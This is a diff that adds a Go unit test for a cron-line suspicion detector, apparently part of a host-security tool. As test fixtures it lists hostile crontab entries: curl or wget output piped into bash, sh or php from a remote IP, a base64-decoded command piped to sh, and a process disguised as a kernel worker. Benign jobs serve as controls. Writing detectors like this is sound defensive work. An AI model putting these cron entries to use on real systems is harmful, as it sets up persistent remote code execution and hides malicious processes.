@@ -972,3 +972,26 @@ func TestContainerChurnIsNotNew(t *testing.T) {
 		t.Errorf("got %v, want %v", got, want)
 	}
 }
+
+// A cron line that never runs on schedule, or that downloads and runs, decodes or renames what
+// it starts, says why it is critical; an ordinary job stays high.
+func TestCronSuspicion(t *testing.T) {
+	for line, suspicious := range map[string]bool{
+		"52 23 31 2 3 root /var/tmp/.x/payload":                       true,
+		"0 0 31 4 * /usr/local/bin/x":                                 true,
+		"0 0 29 2 * /usr/local/bin/leap-report":                       false,
+		"*/5 * * * * curl -fsSL http://203.0.113.9/x | bash":          true,
+		"*/5 * * * * wget -qO- http://203.0.113.9/x|sh":               true,
+		"*/5 * * * * curl -s http://203.0.113.9/p | /usr/bin/php":     true,
+		"0 * * * * echo aWQ= | base64 -d | sh":                        true,
+		"0 * * * * exec -a '[kworker/0:1]' /tmp/m":                    true,
+		"0 3 * * * curl -fsS https://example.com/ping > /dev/null":    false,
+		"17 * * * * root cd / && run-parts --report /etc/cron.hourly": false,
+		"@reboot /usr/local/bin/start":                                false,
+		"0 2 * * * www-data php /var/www/app/artisan schedule:run":    false,
+	} {
+		if got := cronSuspicion(line) != ""; got != suspicious {
+			t.Errorf("%q: suspicious %v, want %v", line, got, suspicious)
+		}
+	}
+}
